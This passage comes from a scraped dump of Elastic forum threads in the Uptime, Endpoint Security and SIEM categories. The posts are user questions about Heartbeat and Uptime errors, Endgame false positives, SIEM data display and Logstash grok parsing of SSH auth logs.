    "url": "https://discuss.elastic.co/t/query-from-uptime-app-causes-outofmemory-exception-in-elasticsearch/186206",
    "title": "Query from Uptime app causes OutOfMemory exception in Elasticsearch",
    "category": [
      "Uptime"
    ],
    "author": "Mattias_Arbin",
    "date": "June 18, 2019, 9:19am June 18, 2019, 9:04am June 18, 2019, 9:05am June 18, 2019, 11:22am June 18, 2019, 11:50am June 19, 2019, 8:24am July 13, 2019, 8:24am",
    "body": "I have a three node ELK cluster with 500M documents in 900 indices. The cluster has been running without any memory-related issues for over a year. I recently started using heartbeat and the Uptime app. Version is 6.8.0. I suddenly started getting OutOfMemory-exceptions that crashed one of the elasticsearch nodes. After some investigations, it is clear that this happens when you click on a link in the Error list table. See screenshot. I get a crash everytime I hit the top row in the table. I have heartbeat data for only 15 days. 2880 heartbeats per day in daily indices. 1 primary and one replica per index.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "4ee4a4b1-3574-475d-8094-81f0777d1d54",
    "url": "https://discuss.elastic.co/t/uptime-tab-says-no-data-available-when-heartbeat-today-index-keeps-incrementing/179160",
    "title": "Uptime Tab says \"No Data Available\" when heartbeat-today index keeps incrementing",
    "category": [
      "Uptime"
    ],
    "author": "phillhocking",
    "date": "April 30, 2019, 10:54pm May 1, 2019, 6:04am May 1, 2019, 7:14am May 1, 2019, 3:31pm May 1, 2019, 5:11pm May 16, 2019, 5:10am June 9, 2019, 5:10am",
    "body": "Hi Elastic friends! My Uptime app tab says \"No uptime data available - Configure Heartbeat to start logging uptime data\" but I have verified that heartbeat is shipping data at least according to _cat/indices: image.png1922×782 69.8 KB It does appear like the uptime data is getting populated and logs on the machine that heartbeat is running on suggests that the data is being shipped, but Uptime doesn't seem to be getting the memo. What am I missing?",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "59d9299f-b6ea-4f61-b19d-8e4a46a3b992",
    "url": "https://discuss.elastic.co/t/uptime-error-graphql-error-too-many-buckets-exception-trying-to-create-too-many-buckets-must-be-less-than-or-equal-to-10000-but-was-10001/179432",
    "title": "Uptime: `Error GraphQL error: [too_many_buckets_exception] Trying to create too many buckets. Must be less than or equal to: [10000] but was [10001]`",
    "category": [
      "Uptime"
    ],
    "author": "phillhocking",
    "date": "May 2, 2019, 8:00pm May 2, 2019, 8:22pm May 2, 2019, 8:31pm May 3, 2019, 6:58am May 3, 2019, 10:58am May 3, 2019, 8:29pm May 3, 2019, 9:29pm May 3, 2019, 11:27pm May 3, 2019, 11:48pm May 27, 2019, 11:48pm",
    "body": "Hey Elastic friends! I recently set up my Elastic cluster with the new 7.0.0 for the purpose of using the Uptime visualizations. I got everything working well, but now when I look at the Uptime tab I receive this error underneath the uptime summary: Error GraphQL error: [too_many_buckets_exception] Trying to create too many buckets. Must be less than or equal to: [10000] but was [10001]. This limit can be set by changing the [search.max_buckets] cluster level setting., with { max_buckets=10000 } image.png1884×848 85 KB I came across this thread Requesting background info on `search.max_buckets` change that says this value is configurable, however, I am not sure where to configure this or what effect changing this value might have on the remainder of my cluster. Additionally, aside from having configured ILM, everything is a default setting - so perhaps the defaults should be changed? I look forward to hearing suggestions for how I can remediate this issue; thanks!",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "f4467a25-459c-4e5e-bcd8-03786a918209",
    "url": "https://discuss.elastic.co/t/uptime-version-7-0-graphql-error/176661",
    "title": "Uptime version 7.0 Graphql error",
    "category": [
      "Uptime"
    ],
    "author": "Luis_Pereira1",
    "date": "April 12, 2019, 3:28pm April 12, 2019, 7:12pm April 15, 2019, 8:52am April 15, 2019, 9:09am April 22, 2019, 5:52pm April 24, 2019, 1:53pm April 25, 2019, 9:30pm April 30, 2019, 5:10pm May 24, 2019, 5:10pm",
    "body": "After the update to version 7.0 the uptime is giving me this error imagem.png1856×128 91.5 KB Any help is appreciated...",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "b8305341-5969-4ce7-b63b-95c14383b90f",
    "url": "https://discuss.elastic.co/t/graphql-errors-uptime-heartbeat/178473",
    "title": "GraphQL errors uptime heartbeat",
    "category": [
      "Uptime"
    ],
    "author": "amergan",
    "date": "April 25, 2019, 1:30pm April 25, 2019, 9:31pm April 26, 2019, 4:21am April 29, 2019, 2:39pm April 29, 2019, 3:27pm April 30, 2019, 5:10pm May 24, 2019, 5:10pm",
    "body": "After configuring heartbeat, i get these errors in uptime. Error GraphQL error: [search_context_exception] unknown type for collapse field monitor.id, only keywords and numbers are acceptedError GraphQL error: [illegal_argument_exception] Fielddata is disabled on text fields by default. Set fielddata=true on [monitor.id] in order to load fielddata in memory by uninverting the inverted index. Note that this can however use significant memory. Alternatively use a keyword field instead. Error GraphQL error: [illegal_argument_exception] Fielddata is disabled on text fields by default. Set fielddata=true on [monitor.id] in order to load fielddata in memory by uninverting the inverted index. Note that this can however use significant memory. Alternatively use a keyword field instead. Error GraphQL error: [illegal_argument_exception] Fielddata is disabled on text fields by default. Set fielddata=true on [monitor.id] in order to load fielddata in memory by uninverting the inverted index. Note that this can however use significant memory. Alternatively use a keyword field instead.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "2b27eb03-1011-4eb1-bc0c-2568eddd4d30",
    "url": "https://discuss.elastic.co/t/kibana-uptime-built-in-dashboard/177644",
    "title": "Kibana Uptime (built-in dashboard)",
    "category": [
      "Uptime"
    ],
    "author": "Ryan_Clark",
    "date": "April 19, 2019, 9:34pm April 19, 2019, 10:05pm April 19, 2019, 10:17pm April 19, 2019, 10:23pm April 24, 2019, 1:05am April 25, 2019, 4:23pm April 26, 2019, 1:27pm May 24, 2019, 1:28pm",
    "body": "Setup: ELK with heartbeat v6.7.1 Heartbeat configured to ping 300+ hosts Problem: In the uptime section in Kibana, it shows me my total hosts count, up count, and down count (with accurate numbers) but in the monitoring status visualization, it only shows me a maximum of 50 hosts. Why is it not showing me the status of all 300+ hosts? I tried searching to see if anyone had the same issue and I'm not finding anything.",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "fa09286b-933f-487e-8f37-8c7045819cd6",
    "url": "https://discuss.elastic.co/t/how-to-change-the-unique-id-in-the-id-field-es-7-0/177887",
    "title": "How to change the unique ID in the ID Field? (ES 7.0)",
    "category": [
      "Uptime"
    ],
    "author": "Matt_Vasquez",
    "date": "April 22, 2019, 5:59pm April 23, 2019, 7:55pm May 17, 2019, 7:55pm",
    "body": "How do I change the value in the ID Field in Up Time? I'd like to replace this with a value such as ID NGINX Reverse Proxy Prod Application Portal Report Application Portal Prod Database Report Database etc.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "101cf281-867a-4a3c-bed1-2dbd9b8765fe",
    "url": "https://discuss.elastic.co/t/autocomplete-for-search-ui-uptime/177162",
    "title": "Autocomplete for Search UI Uptime",
    "category": [
      "Uptime"
    ],
    "author": "Deyvis_Valladares",
    "date": "April 16, 2019, 10:31pm April 17, 2019, 6:06am May 11, 2019, 6:06am",
    "body": "Hi Team, I have a suggest for UI Uptime. I believe is necessary in filter search set autocomplete as Discovery UI filter.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "46b6cfe1-63c0-4646-8bc7-7c7c101379e9",
    "url": "https://discuss.elastic.co/t/gui-suggestion/176692",
    "title": "GUI suggestion",
    "category": [
      "Uptime"
    ],
    "author": "syedsfayaz",
    "date": "April 12, 2019, 6:53pm April 15, 2019, 8:59am April 15, 2019, 5:19pm May 9, 2019, 5:19pm",
    "body": "It would be nice we can see the same GUI as an infrastructure. where I can monitor multiple sites as cubes. I am only monitoring status of multiple site inside my environment. I am monitoring 500 server urls http status. My requirement is only to see what the last status of my http health check is. It will be very convenient to categorize them with a custom field and monitor. The infrastructure dashboard GUI is very appealing. Env status we can show green/red color. If we need more details we can drill down to see whats going on.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "35ca7e98-d94a-4e1f-b378-2692be8e93ba",
    "url": "https://discuss.elastic.co/t/gui-suggestions/176456",
    "title": "GUI Suggestions",
    "category": [
      "Uptime"
    ],
    "author": "Ben_Frost",
    "date": "April 11, 2019, 4:34pm April 15, 2019, 8:58am May 9, 2019, 8:58am",
    "body": "It would be nice to be able to get the status page to fit on a single page versus scrolling or be able to list the errors before the monitor status. It would also be nice to be able to customize the columns to include fields such as tags or more details on what is being monitored. For example, if you have 5 http checks on a host, the monitor status shows just the hostname 5 times (with the port) but no URL information so it's not clear which one(s) are having an issue.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "927209ac-44c8-490e-85ce-e3247bb8dc9e",
    "url": "https://discuss.elastic.co/t/parse-the-field-host/176069",
    "title": "Parse the field host",
    "category": [
      "Uptime"
    ],
    "author": "Luis_Pereira1",
    "date": "April 9, 2019, 4:46pm April 9, 2019, 5:27pm April 10, 2019, 9:11am April 10, 2019, 12:44pm April 10, 2019, 5:11pm May 4, 2019, 5:19pm",
    "body": "Hello can you guys tell me how can i parse this ... I want to change the field host instead of saying icmp-icmp, i want a description or a name of the device. What options are available to do this ?",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "fd38c34e-74ca-45aa-9f3d-ca70b534c71a",
    "url": "https://discuss.elastic.co/t/get-uptime-percentage/176182",
    "title": "Get uptime percentage",
    "category": [
      "Uptime"
    ],
    "author": "OrangeDog",
    "date": "April 10, 2019, 9:29am April 10, 2019, 12:01pm April 10, 2019, 2:32pm May 4, 2019, 2:32pm",
    "body": "I'm not seeing a per-service uptime percentage anywhere in the UI? What's the best way to get it?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "88a4f63a-f08a-4d2c-be0c-a466622fe5d5",
    "url": "https://discuss.elastic.co/t/custom-heartbeat-shipper/176165",
    "title": "Custom heartbeat shipper",
    "category": [
      "Uptime"
    ],
    "author": "suikast42",
    "date": "April 10, 2019, 8:32am April 10, 2019, 12:04pm April 10, 2019, 12:04pm May 4, 2019, 12:04pm",
    "body": "I want track the health state of an application that exposes it's health over mocriprofile heatlhcheck api. So I have multible states in one healthcheck. I can't find in heartbeat a monitor that can handle this. So I end up with a custom solution. I look at the exported fields of heartbeat and try to create a hearbeat entry with that json fields jsonMap.put(\"@timestamp\", zonedDateTime.toString()); jsonMap.put(\"@metadata.beat\", \"heartbeat\"); jsonMap.put(\"@metadata.type\", \"doc\"); jsonMap.put(\"@metadata.version\", \"6.7.0\"); jsonMap.put(\"event.dataset\", \"uptime\"); jsonMap.put(\"beat.name\", \"heartbeat\"); jsonMap.put(\"beat.hostname\", \"heartbeat\"); jsonMap.put(\"beat.version\", \"6.7.0\"); jsonMap.put(\"host.name\", \"heartbeat\"); jsonMap.put(\"tcp.port\", 9090); jsonMap.put(\"monitor.id\", check.getName()); jsonMap.put(\"monitor.status\", check.getState().name().toLowerCase()); jsonMap.put(\"monitor.name\", \"http\"); jsonMap.put(\"monitor.type\", \"http\"); jsonMap.put(\"monitor.scheme\", \"http\"); jsonMap.put(\"monitor.ip\", \"172.17.8.101\"); jsonMap.put(\"http.url\", \"http://172.17.8.1:9990/health\"); jsonMap.put(\"tcp.rtt.connect.us\",50); jsonMap.put(\"http.rtt.response_header.us\",50); jsonMap.put(\"http.rtt.validate.us\",50); jsonMap.put(\"http.rtt.content.us\",50); jsonMap.put(\"http.rtt.write_request.us\",50); jsonMap.put(\"http.rtt.total.us\",5000); if (check.getState() == Entry.State.UP) { jsonMap.put(\"http.response.status_code\", 200); } else { if (check.getData() != null) { jsonMap.put(\"error.type\", \"validate\"); jsonMap.put(\"error.message\", check.getData().getErrorMessage()); } jsonMap.put(\"http.response.status_code\", _outcome.getStatusCode().value()); } With that approach I can see my entries in monitor status but have the follwing problems: Status is invalid Type and IP not shown image.png1636×466 29.3 KB",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "80ee576d-330c-4808-b969-39c17928ff65",
    "url": "https://discuss.elastic.co/t/any-alert-integration-can-be-setup/175671",
    "title": "Any alert integration can be setup?",
    "category": [
      "Uptime"
    ],
    "author": "",
    "date": "April 6, 2019, 9:56am April 6, 2019, 11:59am April 8, 2019, 2:56pm April 8, 2019, 3:59pm April 8, 2019, 8:47pm April 9, 2019, 8:38am May 3, 2019, 8:38am",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "75e9c38b-8852-49de-b240-9753f52a7952",
    "url": "https://discuss.elastic.co/t/6-6-upgrade-to-6-7-on-elastic-cloud-uptime-data-not-showing/175004",
    "title": "6.6 upgrade to 6.7 on Elastic Cloud Uptime data not showing",
    "category": [
      "Uptime"
    ],
    "author": "frankfoti",
    "date": "April 2, 2019, 1:29pm April 2, 2019, 2:45pm April 2, 2019, 9:45pm April 3, 2019, 6:36pm April 3, 2019, 8:47pm April 3, 2019, 8:48pm April 4, 2019, 11:24am April 28, 2019, 11:24am",
    "body": "We upgraded from 6.6 to 6.7 on Elastic Cloud Elasticsearch and Kibana. Then upgraded heartbeat on our internal vm's shipping to logstash. We also re-created the heartbeat template from the heartbeat 6.7 home. The Uptime page shows in kibana but no data is viewable. Thanks",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "05eb5c82-956f-41ce-bc02-5dc0b8530b8f",
    "url": "https://discuss.elastic.co/t/downtime-for-sla-reporting/174146",
    "title": "Downtime for SLA-Reporting",
    "category": [
      "Uptime"
    ],
    "author": "icefish-creativ",
    "date": "March 27, 2019, 9:18pm March 27, 2019, 9:57pm March 27, 2019, 10:49pm April 20, 2019, 10:49pm",
    "body": "Hi Uptime is a really great feature.Is it planned in the next Versions build in \"Downtime\" ? i think it is useful for everybody or rather essential for SLA-Reporting. it would be nice you could set a SLA-Value , so you could also put a monitor on it and see if the service level are violated. Can i expect anything in that direction? ... then i could finally throw Nagios/Icinga out the window cheers Tim",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "359e3e50-394e-4332-a74a-8ab3b369c71e",
    "url": "https://discuss.elastic.co/t/about-the-endpoint-security-category/204977",
    "title": "About the Endpoint Security category",
    "category": [
      "Endpoint Security"
    ],
    "author": "warkolm",
    "date": "October 24, 2019, 12:11am October 24, 2019, 1:08pm",
    "body": "As simple as antivirus, but way more powerful. Prevent, detect, hunt for, and respond to malware and adversaries.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f975b550-6bb5-4593-b938-094e1d7c6381",
    "url": "https://discuss.elastic.co/t/can-you-confirm-this-is-false-positive/228528",
    "title": "Can you confirm this is false positive?",
    "category": [
      "Endpoint Security"
    ],
    "author": "",
    "date": "April 17, 2020, 1:51pm April 20, 2020, 3:51pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e111d448-7298-4d28-aa25-46ba3af00fb0",
    "url": "https://discuss.elastic.co/t/login-issue-between-strigo-and-endpoint-security-fundamentals-course-training-elastic-co/227966",
    "title": "Login Issue between Strigo and Endpoint Security Fundamentals Course (training.elastic.co)",
    "category": [
      "Endpoint Security"
    ],
    "author": "turnermd86",
    "date": "April 14, 2020, 4:52pm April 14, 2020, 9:04pm April 14, 2020, 9:04pm",
    "body": "After enrolling into the Endpoint Security Fundamentals Course, I reviewed the course from my training.elastic.co dashboard under \"My Learning.\" This launched a new tab for the course with this url: scorm.servicerocket.io. Screen11912×1196 187 KB In the \"Setting Up Your Lab\" section, I click the button labeled \"Lab\" and it opens another tab. Screen21918×1197 62.8 KB The only thing that populates in the new tab is the word \"Loading...\" for a couple of seconds, then it displays \"Workspace not found.\" Screen31919×1198 64.3 KB I was able to login a couple of weeks ago when I began the course. I am also able to navigate to https://app.strigo.io/guide and login with my google account email. I have tried to get it to reset my password and was unsuccessful due to originally signing up with my google account. How do I get back in before my training expires on Saturday?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "f4777459-0fd9-4386-abea-14c232c73d43",
    "url": "https://discuss.elastic.co/t/overlap-between-endgame-binary-and-auditbeat-packetbeat/219386",
    "title": "Overlap between Endgame binary and Auditbeat/Packetbeat",
    "category": [
      "Endpoint Security"
    ],
    "author": "elenoir",
    "date": "February 14, 2020, 2:39pm March 13, 2020, 2:39pm",
    "body": "Hi, Since I've watched the Endpoint Security webinar I was wondering about the differences between endgame binary and AuditBeat/PacketBeat ones. Indeed, let's assume that the endgame binary is installed on one host, it should have the same capabilities as AuditBeat and PacketBeat right? Is it useful to install the three ones on one host? Thanks, Erik",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "ca6d730c-de19-473a-aba3-4dc4fcec428a",
    "url": "https://discuss.elastic.co/t/ip-filtering-on-elastic-cloud/216233",
    "title": "Ip filtering on elastic cloud",
    "category": [
      "Endpoint Security"
    ],
    "author": "Eladsig",
    "date": "January 23, 2020, 12:10pm February 4, 2020, 4:10pm March 3, 2020, 4:10pm",
    "body": "hello, i am trying to configure ip filtering for my instance on elastic cloud. i want to block all unallowed ip addresses to my elasticsearch and kibana. i tried to follow this : guide and edit User setting overrides on my data instance. i got error: 'xpack.security.transport.filter.allow': is not allowed OR: 'xpack.security.transport.filter.enabled': is not allowed how can i do it? thank you",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "e67974d4-c1f3-426d-aebd-d856e0e15596",
    "url": "https://discuss.elastic.co/t/blog-series-on-macos-system-extensions-and-endpointsecurity-framework/214134",
    "title": "Blog series on macOS system extensions and EndpointSecurity framework",
    "category": [
      "Endpoint Security"
    ],
    "author": "tonymeehan",
    "date": "January 7, 2020, 9:20pm February 4, 2020, 9:20pm",
    "body": "Be sure to check out our new blog series on macOS system extension changes, the new EndpointSecurity and NetworkExtension frameworks, and tips and tricks for tacking advantage of these new systems to effectively protect macOS systems. Elastic Blog – 7 Jan 20 Mac system extensions for threat detection: Part 1 In part 1, we’ll go over some of the frameworks accessible by Mac kernel extensions that provide information about file system, process, and network events.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "17222fcb-cf35-49a7-bfdc-22ecdc7dc862",
    "url": "https://discuss.elastic.co/t/endgame/213227",
    "title": "Endgame",
    "category": [
      "Endpoint Security"
    ],
    "author": "odweik",
    "date": "December 27, 2019, 7:28pm January 7, 2020, 9:17pm February 4, 2020, 9:17pm",
    "body": "Hello, How I can learn Endgame endpoint security",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "4f652bb5-29f1-4c91-a72e-048a468171a7",
    "url": "https://discuss.elastic.co/t/endpoint-security-on-elastic-stack-community-slack/212696",
    "title": "Endpoint Security on Elastic Stack Community Slack",
    "category": [
      "Endpoint Security"
    ],
    "author": "tonymeehan",
    "date": "December 20, 2019, 6:36pm January 17, 2020, 6:36pm",
    "body": "In case you missed the announcement, we've got a community Slack setup for discussing endpoint security. See https://twitter.com/elastic/status/1207631666362998784 for more details and join us in #endpoint-security! -Tony",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "27d7a364-35c4-49ac-b80c-909ea7c7ff93",
    "url": "https://discuss.elastic.co/t/false-positive/208846",
    "title": "False positive",
    "category": [
      "Endpoint Security"
    ],
    "author": "vnovomeska",
    "date": "November 21, 2019, 9:43am December 6, 2019, 10:04pm January 3, 2020, 10:04pm",
    "body": "Hello, I encountered a false positive: https://www.virustotal.com/gui/file/9fdd641a90f64de570e08202dc0ffe9db8a94264bf969dcf16037413db49da1e/detection Endgame reports \"Malicious (moderate Confidence)\" but the file is safe and all other security vendors report \"Undetected\". Is it possible to fix this false positive please? Thanks.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9fceeb69-346e-4af5-b838-8c7c84c7b137",
    "url": "https://discuss.elastic.co/t/pricing-et-al/205410",
    "title": "Pricing et al",
    "category": [
      "Endpoint Security"
    ],
    "author": "hilt86",
    "date": "October 28, 2019, 6:39am October 28, 2019, 7:39pm November 21, 2019, 12:09am November 21, 2019, 12:54am November 21, 2019, 1:31am December 6, 2019, 10:03pm January 3, 2020, 10:03pm",
    "body": "How does endpoint security pricing work? After releasing such an exciting product you've made it very difficult to find / evaluate and buy Endpoint security..! H",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "b59d7372-e766-45a0-908e-f2145fb96b1c",
    "url": "https://discuss.elastic.co/t/deal-with-false-positives/208950",
    "title": "Deal with false positives",
    "category": [
      "Endpoint Security"
    ],
    "author": "p3464782",
    "date": "November 21, 2019, 5:48pm December 6, 2019, 10:00pm January 3, 2020, 10:01pm",
    "body": "Can one overrule a triggered detection and response rule via e.g. the API, for example if a false positive is identified by my company? Or does the Kibana SIEM allows an analist to revert any automatic responses?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a4cb6724-09b1-4893-bd1a-20861361934f",
    "url": "https://discuss.elastic.co/t/edr-in-parallel-with-av/208946",
    "title": "EDR in parallel with AV",
    "category": [
      "Endpoint Security"
    ],
    "author": "p3464782",
    "date": "November 21, 2019, 5:44pm November 21, 2019, 7:16pm December 19, 2019, 7:16pm",
    "body": "Is it technically possible to run an Endgame or Elastic Endpoint Security agent in parallel with an existing AV/EPP solution like ESET, or does the agent conflicts with any AV running on the same system?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "cf04e354-c2e8-4ef2-86c3-ebecc1f2931d",
    "url": "https://discuss.elastic.co/t/agent-deployments-multi-tenancy/208948",
    "title": "Agent deployments multi tenancy",
    "category": [
      "Endpoint Security"
    ],
    "author": "p3464782",
    "date": "November 21, 2019, 5:46pm December 19, 2019, 5:46pm",
    "body": "Will the Elastic Endpoint Security cloud environment have multi-tenancy capabilities to group agents within multiple organizations/networks, for example within Kibana?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "b8808ccf-068d-4594-a3fd-cd802679ed08",
    "url": "https://discuss.elastic.co/t/false-postive-submission/205449",
    "title": "False Postive submission",
    "category": [
      "Endpoint Security"
    ],
    "author": "kman",
    "date": "October 28, 2019, 11:26am October 28, 2019, 7:31pm October 29, 2019, 7:08am November 26, 2019, 7:18am",
    "body": "Hi, our software is being detected by Endgame engine. we would like to remove the detection, could you guide me what needs to be done? thanks",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "3d9a1de2-b5f2-4fdd-86ac-4c833afd76bb",
    "url": "https://discuss.elastic.co/t/endpoint-introductions/205093",
    "title": "Endpoint Introductions",
    "category": [
      "Endpoint Security"
    ],
    "author": "Wadson",
    "date": "October 24, 2019, 2:36pm November 21, 2019, 2:36pm",
    "body": "Welcome to Elastic Endpoint! I'm Wadson and I am on the Endpoint Implementation team here at Elastic on the East Coast. If you're new to Elastic Endpoint or have already purchased Endpoint please introduce yourself here!",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "bc94ba30-54cb-42ba-9c8b-4ee5f8c4ae3b",
    "url": "https://discuss.elastic.co/t/about-the-siem-category/181817",
    "title": "About the SIEM category",
    "category": [
      "SIEM"
    ],
    "author": "dadoonet",
    "date": "June 4, 2019, 10:00pm",
    "body": "Discussion about the Elastic SIEM app, supporting security information and event management use cases",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "69a8296c-3312-4bb6-bca8-c70d55476b5f",
    "url": "https://discuss.elastic.co/t/prebuilt-ml-jobs-cant-be-activated/229138",
    "title": "Prebuilt ML Jobs cant be activated",
    "category": [
      "SIEM"
    ],
    "author": "david-vazquez",
    "date": "April 21, 2020, 10:37pm April 21, 2020, 11:25pm April 22, 2020, 7:35pm",
    "body": "Hello all, I´m trying to activate all prebuilt Machine Learning Jobs, but cant success it. I Try to active them from the SIEM \"Anomalies Detection\" menu, but mostly jobs don´t get activated. More properly, I could activate the packetbeat prebuilt jobs, but mostly of the Windows jobs are not getting activated, and I don´t know why. Any idea about what can be happening? When I try from Machine learning \"Start Datafeed\", it shows an error. On the other hand, I´m trying to build a Malware Laboratory, and detect that Malware using ML jobs. Can I do it using the prebuilt ML jobs from Windows or should I create some? I could activate the \"rare process\" ML job, but no \"anomalies\" were detected even when I runned Malware samples. Thank you very much. Regards",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "01179f6c-0ed5-41d2-a060-48b29821c813",
    "url": "https://discuss.elastic.co/t/kibana-siem-display-problem-just-spinning-no-error/228488",
    "title": "Kibana SIEM display problem just spinning no error",
    "category": [
      "SIEM"
    ],
    "author": "Bartekk",
    "date": "April 20, 2020, 9:40pm April 21, 2020, 1:59am April 21, 2020, 11:30am April 21, 2020, 2:41pm April 21, 2020, 4:14pm April 21, 2020, 6:03pm April 22, 2020, 6:24am April 22, 2020, 2:18pm",
    "body": "Hi i've problem in SIEM/NETWORK/Flows i've just spinning ring and nothing displays , before update everything was fine. 1845×1059 79.8 KB and log https://pastebin.pl/view/88c362e3 i dont see nothing special here ;/ No idea how to fix it or where to search.",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "8ebac562-1d3b-4e1a-bbff-14233322c524",
    "url": "https://discuss.elastic.co/t/siem-does-not-show-data/229010",
    "title": "SIEM does not show data",
    "category": [
      "SIEM"
    ],
    "author": "Minh_Ti_n_Tr_n",
    "date": "April 21, 2020, 9:47am April 21, 2020, 11:59am April 21, 2020, 2:43pm April 22, 2020, 2:43am April 22, 2020, 1:00pm April 22, 2020, 1:24pm April 22, 2020, 1:54pm",
    "body": "I got the problem: Fielddata is disabled on text fields by default. Set fielddata=true on [source.ip] in order to load fielddata in memory by uninverting the inverted index. Note that this can however use significant memory. Alternatively use a keyword field instead I tried on dev tool PUT filebeat-*/_mapping { \"properties\": { \"my_field\": { \"type\": \"text\", \"fielddata\": true } } } and got: { \"acknowledged\" : true } But till not see the data on kibana. Then I tried: PUT filebeat-*/_mapping/text { \"your_type\": { \"properties\": { \"publisher\": { \"type\": \"text\", \"fielddata\": true } } } } And got: { \"error\": { \"root_cause\": [ { \"type\": \"illegal_argument_exception\", \"reason\": \"Types cannot be provided in put mapping requests, unless the include_type_name parameter is set to true.\" } ], \"type\": \"illegal_argument_exception\", \"reason\": \"Types cannot be provided in put mapping requests, unless the include_type_name parameter is set to true.\" }, \"status\": 400 } Any solution to make data show on kibana please! Thanks & Regards",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "0c4ce0a5-57af-4f8e-9be0-7481da66a341",
    "url": "https://discuss.elastic.co/t/aggregation-of-incoming-events-on-common-fields-for-siem-usecase/229206",
    "title": "Aggregation of incoming events on common fields for SIEM usecase",
    "category": [
      "SIEM"
    ],
    "author": "ParashB",
    "date": "April 22, 2020, 8:26am",
    "body": "How can I do aggregation of incoming events on common fields to reduce the incoming EPS? Refer the AGGREGATION OF EVENTS section in \"https://socprime.com/en/blog/arcsight-optimizing-eps-aggregation-and-filtration/\" for more detail. I think it could be done at logstash but can't find relevant documentation so it would be helpful if someone could point me in the right direction.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "94d3f58b-e8e4-4d1a-abb8-68aaed45c6cd",
    "url": "https://discuss.elastic.co/t/how-to-apply-third-party-or-custom-threat-intel-feeds-with-siem-app/228312",
    "title": "How to apply Third Party or Custom Threat intel feeds with SIEM App?",
    "category": [
      "SIEM"
    ],
    "author": "Blason",
    "date": "April 16, 2020, 12:06pm April 21, 2020, 7:26pm April 22, 2020, 2:58am",
    "body": "Hi Guys, Can anyone please suggest me the way to apply third party threat intel feed to SIEM App? Has that to be done with logstash translate dictionary feature? but since there are multiple indices involved can someone please guide me? TIA Blason R",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3524d783-8b07-4e6c-b595-83dc3a58a163",
    "url": "https://discuss.elastic.co/t/ssh-auth-logs-not-visualized-in-kibana/227484",
    "title": "SSH auth logs not visualized in Kibana",
    "category": [
      "SIEM"
    ],
    "author": "ArnimS",
    "date": "April 21, 2020, 10:08am April 18, 2020, 11:48am April 21, 2020, 10:09am April 21, 2020, 12:20pm",
    "body": "Hi everyone! I'm relatively new to the Elasticstack and currently trying to set up a centralized dashboard for the logs of all my servers. (And also use the system to replicate all logs to my monitoring server, where I'm currently trying to install the 7.x Elasticstack on) My problem is that Kibana doesn't visualize ssh login attempts although it seems to get the data as \"system.auth\". Screenshot of the Dashboard: Download1913×945 117 KB Screenshot of the \"Logs\" section: Download (1)1917×944 177 KB Setup: Server1 (CentOS 7): monitoring.myhost.tld (10.10.10.10 external IP, 1.1.1.1 internal IP) Elasticsearch (listening on localhost) Kibana (listening on localhost) Logstash (listening on 1.1.1.1) Filebeat Nginx (Used as a reverse proxy for Kibana, listening on 10.10.10.10) Server2 (Debian 10) Filebeat Server3 (CentOS 7) Filebeat and so on... (All are Debian or CentOS) Config files (I just wrote down the changes I made): Server1 (Elasticsearch): /etc/elasticsearch/elasticsearch.yml: network.host: localhost Server1 (Kibana): //No changes Server1 (Logstash): /etc/logstash/conf.d/02-beats-input.conf: input { beats { port => \"5044\" host => \"1.1.1.1\" } } /etc/logstash/conf.d/10-syslog-filter.conf: filter { if [fileset][module] == \"system\" { if [fileset][name] == \"auth\" { grok { match => { \"message\" => [\"%{SYSLOGTIMESTAMP:[system][auth][timestamp]} %{SYSLOGHOST:[system][auth][hostname]} sshd(?:\\[%{POSINT:[system][auth][pid]}\\])?: %{DATA:[system][auth][ssh][event]} %{DATA:[system][auth][ssh][method]} for (invalid user )?%{DATA:[system][auth][user]} from %{IPORHOST:[system][auth][ssh][ip]} port %{NUMBER:[system][auth][ssh][port]} ssh2(: %{GREEDYDATA:[system][auth][ssh][signature]})?\", \"%{SYSLOGTIMESTAMP:[system][auth][timestamp]} %{SYSLOGHOST:[system][auth][hostname]} sshd(?:\\[%{POSINT:[system][auth][pid]}\\])?: %{DATA:[system][auth][ssh][event]} user %{DATA:[system][auth][user]} from %{IPORHOST:[system][auth][ssh][ip]}\", \"%{SYSLOGTIMESTAMP:[system][auth][timestamp]} %{SYSLOGHOST:[system][auth][hostname]} sshd(?:\\[%{POSINT:[system][auth][pid]}\\])?: Did not receive identification string from %{IPORHOST:[system][auth][ssh][dropped_ip]}\", 